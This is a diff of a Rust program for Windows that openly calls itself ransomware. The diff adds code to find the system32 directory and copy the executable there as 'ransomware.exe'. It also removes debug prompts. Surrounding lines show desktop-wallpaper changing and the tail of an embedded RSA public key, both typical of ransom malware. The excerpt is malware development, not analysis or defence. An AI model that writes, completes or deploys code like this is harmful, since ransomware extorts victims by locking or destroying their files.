@@ -1,12 +1,13 @@
 pub mod build;
 
-use std::ffi::OsStr;
+use std::ffi::{OsStr, OsString};
 use std::fs::{self, remove_file, File};
 use std::io::{self, BufWriter, Read, Write};
-use std::os::windows::ffi::OsStrExt;
+use std::os::windows::ffi::{OsStrExt, OsStringExt};
 use std::path::Path;
 
 extern crate winapi;
+use winapi::um::sysinfoapi::GetSystemDirectoryW;
 use winapi::um::winuser::{SystemParametersInfoW, SPI_SETDESKWALLPAPER, SPIF_UPDATEINIFILE, SPIF_SENDCHANGE};
 
 
@@ -205,7 +206,10 @@ SwIDAQAB
     io::stdin().read_line(&mut input)
         .expect("Failed to read line");
 
-    let dest_dir = Path::new(r"%WINDIR%\system32\ransomware.exe");
+    // let dest_dir = Path::new(r"Windows\system32\ransomware.exe");
+    let mut dest_dir = get_system32_path();
+    dest_dir.push("ransomware.exe");
+
 
 
     let current_exe_path = match std::env::current_exe() {
@@ -216,10 +220,6 @@ SwIDAQAB
         }
     };
 
-    let mut input = String::new();
-    io::stdin().read_line(&mut input)
-        .expect("Failed to read line");
-    println!("{:?}", current_exe_path);
 
     let mut input = String::new();
     
@@ -278,4 +278,12 @@ fn set_desktop_background(path: &str) -> Result<(), String> {
     }
 
     Ok(())
+}
+
+fn get_system32_path() -> OsString {
+    let mut buffer: [u16; winapi::shared::minwindef::MAX_PATH] = [0; winapi::shared::minwindef::MAX_PATH];
+    unsafe {
+        let len = GetSystemDirectoryW(buffer.as_mut_ptr(), buffer.len() as u32) as usize;
+        OsString::from_wide(&buffer[..len])
+    }
 }
